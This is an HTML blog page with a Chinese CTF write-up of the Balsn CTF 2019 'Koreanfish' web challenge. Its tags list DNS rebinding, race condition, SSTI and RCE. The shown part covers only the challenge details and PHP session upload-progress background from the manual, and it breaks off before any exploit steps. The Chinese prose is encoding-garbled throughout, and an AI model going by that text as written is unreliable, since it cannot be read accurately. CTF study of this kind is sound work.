<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="å‰è¨€è¿™æ¬¡æ‰“äº†Balsn-ctf-2019æ„Ÿè§‰é¢˜ç›®è¿˜ä¸é”™å› æ­¤æ€»ç»“ä¸€æ³¢ã€‚ 0x01 Koreanfishé¢˜ç›®æè¿°å°æ¹¾äººå–œæ¬¢éŸ©å›½ğŸŸ Difficulty:éš¾ Type:web Solved:15/720 Tag:PHP,DNS Rebinding,Flask,Race condition,SSTI,RCE  Source Codeè¿™æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œå¹¶ä¸”å…¨éƒ¨çš„æºç æ˜¯éå¸¸çŸ­çš„å¹¶ä¸”æ˜¯ç®€å•çš„ã€‚å‰ç½®çŸ¥è¯†ã€‚Ses">
<meta property="og:type" content="article">
<meta property="og:title" content="2019balsnCTFçš„Warmupå’Œkoreanfishèµ›åå¤ç°">
<meta property="og:url" content="http://yoursite.com/2019/12/19/2019balsnCTFçš„Warmupå’Œkoreanfishèµ›åå¤ç°/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="å‰è¨€è¿™æ¬¡æ‰“äº†Balsn-ctf-2019æ„Ÿè§‰é¢˜ç›®è¿˜ä¸é”™å› æ­¤æ€»ç»“ä¸€æ³¢ã€‚ 0x01 Koreanfishé¢˜ç›®æè¿°å°æ¹¾äººå–œæ¬¢éŸ©å›½ğŸŸ Difficulty:éš¾ Type:web Solved:15/720 Tag:PHP,DNS Rebinding,Flask,Race condition,SSTI,RCE  Source Codeè¿™æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œå¹¶ä¸”å…¨éƒ¨çš„æºç æ˜¯éå¸¸çŸ­çš„å¹¶ä¸”æ˜¯ç®€å•çš„ã€‚å‰ç½®çŸ¥è¯†ã€‚Ses">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-12-19T11:15:32.147Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019balsnCTFçš„Warmupå’Œkoreanfishèµ›åå¤ç°">
<meta name="twitter:description" content="å‰è¨€è¿™æ¬¡æ‰“äº†Balsn-ctf-2019æ„Ÿè§‰é¢˜ç›®è¿˜ä¸é”™å› æ­¤æ€»ç»“ä¸€æ³¢ã€‚ 0x01 Koreanfishé¢˜ç›®æè¿°å°æ¹¾äººå–œæ¬¢éŸ©å›½ğŸŸ Difficulty:éš¾ Type:web Solved:15/720 Tag:PHP,DNS Rebinding,Flask,Race condition,SSTI,RCE  Source Codeè¿™æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œå¹¶ä¸”å…¨éƒ¨çš„æºç æ˜¯éå¸¸çŸ­çš„å¹¶ä¸”æ˜¯ç®€å•çš„ã€‚å‰ç½®çŸ¥è¯†ã€‚Ses">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/12/19/2019balsnCTFçš„Warmupå’Œkoreanfishèµ›åå¤ç°/">





  <title>2019balsnCTFçš„Warmupå’Œkoreanfishèµ›åå¤ç° | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            å…³äº
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            åˆ†ç±»
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            å½’æ¡£
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/19/2019balsnCTFçš„Warmupå’Œkoreanfishèµ›åå¤ç°/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">2019balsnCTFçš„Warmupå’Œkoreanfishèµ›åå¤ç°</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-19T19:14:27+08:00">
                2019-12-19
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  3.1k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  14
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>è¿™æ¬¡æ‰“äº†Balsn-ctf-2019æ„Ÿè§‰é¢˜ç›®è¿˜ä¸é”™å› æ­¤æ€»ç»“ä¸€æ³¢ã€‚</p>
<h4 id="0x01-Koreanfish"><a href="#0x01-Koreanfish" class="headerlink" title="0x01 Koreanfish"></a>0x01 Koreanfish</h4><h5 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><h5 id="å°æ¹¾äººå–œæ¬¢éŸ©å›½ğŸŸ"><a href="#å°æ¹¾äººå–œæ¬¢éŸ©å›½ğŸŸ" class="headerlink" title="å°æ¹¾äººå–œæ¬¢éŸ©å›½ğŸŸ"></a>å°æ¹¾äººå–œæ¬¢éŸ©å›½ğŸŸ</h5><ul>
<li>Difficulty:éš¾</li>
<li>Type:web</li>
<li>Solved:15/720</li>
<li>Tag:PHP,DNS Rebinding,Flask,Race condition,SSTI,RCE</li>
</ul>
<h5 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a><a href="https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/Koreanfish/" target="_blank" rel="noopener">Source Code</a></h5><h5 id="è¿™æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œå¹¶ä¸”å…¨éƒ¨çš„æºç æ˜¯éå¸¸çŸ­çš„å¹¶ä¸”æ˜¯ç®€å•çš„ã€‚"><a href="#è¿™æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œå¹¶ä¸”å…¨éƒ¨çš„æºç æ˜¯éå¸¸çŸ­çš„å¹¶ä¸”æ˜¯ç®€å•çš„ã€‚" class="headerlink" title="è¿™æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œå¹¶ä¸”å…¨éƒ¨çš„æºç æ˜¯éå¸¸çŸ­çš„å¹¶ä¸”æ˜¯ç®€å•çš„ã€‚"></a>è¿™æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œå¹¶ä¸”å…¨éƒ¨çš„æºç æ˜¯éå¸¸çŸ­çš„å¹¶ä¸”æ˜¯ç®€å•çš„ã€‚</h5><h5 id="å‰ç½®çŸ¥è¯†ã€‚"><a href="#å‰ç½®çŸ¥è¯†ã€‚" class="headerlink" title="å‰ç½®çŸ¥è¯†ã€‚"></a>å‰ç½®çŸ¥è¯†ã€‚</h5><h5 id="Sessionä¸Šä¼ è¿›åº¦ã€‚"><a href="#Sessionä¸Šä¼ è¿›åº¦ã€‚" class="headerlink" title="Sessionä¸Šä¼ è¿›åº¦ã€‚"></a>Sessionä¸Šä¼ è¿›åº¦ã€‚</h5><h5 id="å½“-session-upload-progress-enabled-INI-é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP-èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚-è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€"><a href="#å½“-session-upload-progress-enabled-INI-é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP-èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚-è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€" class="headerlink" title="å½“ session.upload_progress.enabled INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€"></a>å½“ session.upload_progress.enabled INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€</h5><h5 id="å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session-upload-progress-nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨-SESSIONä¸­è·å¾—ã€‚-å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨-SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®-ç´¢å¼•æ˜¯-session-upload-progress-prefix-ä¸-session-upload-progress-nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚-é€šå¸¸è¿™äº›é”®å€¼å¯ä»¥é€šè¿‡è¯»å–INIè®¾ç½®æ¥è·å¾—ï¼Œä¾‹å¦‚"><a href="#å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session-upload-progress-nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨-SESSIONä¸­è·å¾—ã€‚-å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨-SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®-ç´¢å¼•æ˜¯-session-upload-progress-prefix-ä¸-session-upload-progress-nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚-é€šå¸¸è¿™äº›é”®å€¼å¯ä»¥é€šè¿‡è¯»å–INIè®¾ç½®æ¥è·å¾—ï¼Œä¾‹å¦‚" class="headerlink" title="å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ session.upload_progress.prefix ä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚ é€šå¸¸è¿™äº›é”®å€¼å¯ä»¥é€šè¿‡è¯»å–INIè®¾ç½®æ¥è·å¾—ï¼Œä¾‹å¦‚"></a>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ session.upload_progress.prefix ä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚ é€šå¸¸è¿™äº›é”®å€¼å¯ä»¥é€šè¿‡è¯»å–INIè®¾ç½®æ¥è·å¾—ï¼Œä¾‹å¦‚</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = ini_get(<span class="string">"session.upload_progress.prefix"</span>) . ini_get(<span class="string">"session.upload-progress.name"</span>);</span><br><span class="line">var_dump($_SESSION[$key]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="é€šè¿‡å°†-SESSION-key-â€œcancel-uploadâ€-è®¾ç½®ä¸ºTRUEï¼Œè¿˜å¯ä»¥å–æ¶ˆä¸€ä¸ªæ­£åœ¨å¤„ç†ä¸­çš„æ–‡ä»¶ä¸Šä¼ ã€‚-å½“åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ï¼Œå®ƒä»…ä¼šå–æ¶ˆå½“å‰æ­£åœ¨å¤„ç†çš„æ–‡ä»¶ä¸Šä¼ å’Œæœªå¤„ç†çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¸ä¼šç§»é™¤é‚£äº›å·²ç»å®Œæˆçš„ä¸Šä¼ ã€‚-å½“ä¸€ä¸ªä¸Šä¼ è¯·æ±‚è¢«è¿™ä¹ˆå–æ¶ˆæ—¶ï¼Œ-FILESä¸­çš„errorå°†ä¼šè¢«è®¾ç½®ä¸º-UPLOAD-ERR-EXTENSIONã€‚"><a href="#é€šè¿‡å°†-SESSION-key-â€œcancel-uploadâ€-è®¾ç½®ä¸ºTRUEï¼Œè¿˜å¯ä»¥å–æ¶ˆä¸€ä¸ªæ­£åœ¨å¤„ç†ä¸­çš„æ–‡ä»¶ä¸Šä¼ ã€‚-å½“åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ï¼Œå®ƒä»…ä¼šå–æ¶ˆå½“å‰æ­£åœ¨å¤„ç†çš„æ–‡ä»¶ä¸Šä¼ å’Œæœªå¤„ç†çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¸ä¼šç§»é™¤é‚£äº›å·²ç»å®Œæˆçš„ä¸Šä¼ ã€‚-å½“ä¸€ä¸ªä¸Šä¼ è¯·æ±‚è¢«è¿™ä¹ˆå–æ¶ˆæ—¶ï¼Œ-FILESä¸­çš„errorå°†ä¼šè¢«è®¾ç½®ä¸º-UPLOAD-ERR-EXTENSIONã€‚" class="headerlink" title="é€šè¿‡å°†$_SESSION[$key][â€œcancel_uploadâ€]è®¾ç½®ä¸ºTRUEï¼Œè¿˜å¯ä»¥å–æ¶ˆä¸€ä¸ªæ­£åœ¨å¤„ç†ä¸­çš„æ–‡ä»¶ä¸Šä¼ ã€‚ å½“åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ï¼Œå®ƒä»…ä¼šå–æ¶ˆå½“å‰æ­£åœ¨å¤„ç†çš„æ–‡ä»¶ä¸Šä¼ å’Œæœªå¤„ç†çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¸ä¼šç§»é™¤é‚£äº›å·²ç»å®Œæˆçš„ä¸Šä¼ ã€‚ å½“ä¸€ä¸ªä¸Šä¼ è¯·æ±‚è¢«è¿™ä¹ˆå–æ¶ˆæ—¶ï¼Œ$_FILESä¸­çš„errorå°†ä¼šè¢«è®¾ç½®ä¸º UPLOAD_ERR_EXTENSIONã€‚"></a>é€šè¿‡å°†$_SESSION[$key][â€œcancel_uploadâ€]è®¾ç½®ä¸ºTRUEï¼Œè¿˜å¯ä»¥å–æ¶ˆä¸€ä¸ªæ­£åœ¨å¤„ç†ä¸­çš„æ–‡ä»¶ä¸Šä¼ ã€‚ å½“åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ï¼Œå®ƒä»…ä¼šå–æ¶ˆå½“å‰æ­£åœ¨å¤„ç†çš„æ–‡ä»¶ä¸Šä¼ å’Œæœªå¤„ç†çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¸ä¼šç§»é™¤é‚£äº›å·²ç»å®Œæˆçš„ä¸Šä¼ ã€‚ å½“ä¸€ä¸ªä¸Šä¼ è¯·æ±‚è¢«è¿™ä¹ˆå–æ¶ˆæ—¶ï¼Œ$_FILESä¸­çš„errorå°†ä¼šè¢«è®¾ç½®ä¸º UPLOAD_ERR_EXTENSIONã€‚</h5><h5 id="session-upload-progress-freq-å’Œ-session-upload-progress-min-freq-INIé€‰é¡¹æ§åˆ¶äº†ä¸Šä¼ è¿›åº¦ä¿¡æ¯åº”è¯¥å¤šä¹…è¢«é‡æ–°è®¡ç®—ä¸€æ¬¡ã€‚-é€šè¿‡åˆç†è®¾ç½®è¿™ä¸¤ä¸ªé€‰é¡¹çš„å€¼ï¼Œè¿™ä¸ªåŠŸèƒ½çš„å¼€é”€å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚"><a href="#session-upload-progress-freq-å’Œ-session-upload-progress-min-freq-INIé€‰é¡¹æ§åˆ¶äº†ä¸Šä¼ è¿›åº¦ä¿¡æ¯åº”è¯¥å¤šä¹…è¢«é‡æ–°è®¡ç®—ä¸€æ¬¡ã€‚-é€šè¿‡åˆç†è®¾ç½®è¿™ä¸¤ä¸ªé€‰é¡¹çš„å€¼ï¼Œè¿™ä¸ªåŠŸèƒ½çš„å¼€é”€å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚" class="headerlink" title="session.upload_progress.freq å’Œ session.upload_progress.min_freq INIé€‰é¡¹æ§åˆ¶äº†ä¸Šä¼ è¿›åº¦ä¿¡æ¯åº”è¯¥å¤šä¹…è¢«é‡æ–°è®¡ç®—ä¸€æ¬¡ã€‚ é€šè¿‡åˆç†è®¾ç½®è¿™ä¸¤ä¸ªé€‰é¡¹çš„å€¼ï¼Œè¿™ä¸ªåŠŸèƒ½çš„å¼€é”€å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚"></a>session.upload_progress.freq å’Œ session.upload_progress.min_freq INIé€‰é¡¹æ§åˆ¶äº†ä¸Šä¼ è¿›åº¦ä¿¡æ¯åº”è¯¥å¤šä¹…è¢«é‡æ–°è®¡ç®—ä¸€æ¬¡ã€‚ é€šè¿‡åˆç†è®¾ç½®è¿™ä¸¤ä¸ªé€‰é¡¹çš„å€¼ï¼Œè¿™ä¸ªåŠŸèƒ½çš„å¼€é”€å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</h5><h5 id="Example-1-æ ·ä¾‹ä¿¡æ¯"><a href="#Example-1-æ ·ä¾‹ä¿¡æ¯" class="headerlink" title="Example #1 æ ·ä¾‹ä¿¡æ¯"></a>Example #1 æ ·ä¾‹ä¿¡æ¯</h5><h5 id="ä¸€ä¸ªä¸Šä¼ è¿›åº¦æ•°ç»„çš„ç»“æ„çš„ä¾‹å­"><a href="#ä¸€ä¸ªä¸Šä¼ è¿›åº¦æ•°ç»„çš„ç»“æ„çš„ä¾‹å­" class="headerlink" title="ä¸€ä¸ªä¸Šä¼ è¿›åº¦æ•°ç»„çš„ç»“æ„çš„ä¾‹å­"></a>ä¸€ä¸ªä¸Šä¼ è¿›åº¦æ•°ç»„çš„ç»“æ„çš„ä¾‹å­</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&quot; value=&quot;123&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file2&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<h5 id="åœ¨sessionä¸­å­˜æ”¾çš„æ•°æ®çœ‹ä¸Šå»æ˜¯è¿™æ ·å­çš„ï¼š"><a href="#åœ¨sessionä¸­å­˜æ”¾çš„æ•°æ®çœ‹ä¸Šå»æ˜¯è¿™æ ·å­çš„ï¼š" class="headerlink" title="åœ¨sessionä¸­å­˜æ”¾çš„æ•°æ®çœ‹ä¸Šå»æ˜¯è¿™æ ·å­çš„ï¼š"></a>åœ¨sessionä¸­å­˜æ”¾çš„æ•°æ®çœ‹ä¸Šå»æ˜¯è¿™æ ·å­çš„ï¼š</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_SESSION[<span class="string">"upload_progress_123"</span>] = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time</span></span><br><span class="line"> <span class="string">"content_length"</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length</span></span><br><span class="line"> <span class="string">"bytes_processed"</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed</span></span><br><span class="line"> <span class="string">"done"</span> =&gt; <span class="keyword">false</span>,              <span class="comment">// true when the POST handler has finished, successfully or not</span></span><br><span class="line"> <span class="string">"files"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">"field_name"</span> =&gt; <span class="string">"file1"</span>,       <span class="comment">// Name of the &lt;input/&gt; field</span></span><br><span class="line">   <span class="comment">// The following 3 elements equals those in $_FILES</span></span><br><span class="line">   <span class="string">"name"</span> =&gt; <span class="string">"foo.avi"</span>,</span><br><span class="line">   <span class="string">"tmp_name"</span> =&gt; <span class="string">"/tmp/phpxxxxxx"</span>,</span><br><span class="line">   <span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">"done"</span> =&gt; <span class="keyword">true</span>,                <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line">   <span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,    <span class="comment">// When this file has started to be processed</span></span><br><span class="line">   <span class="string">"bytes_processed"</span> =&gt; <span class="number">57343250</span>, <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span 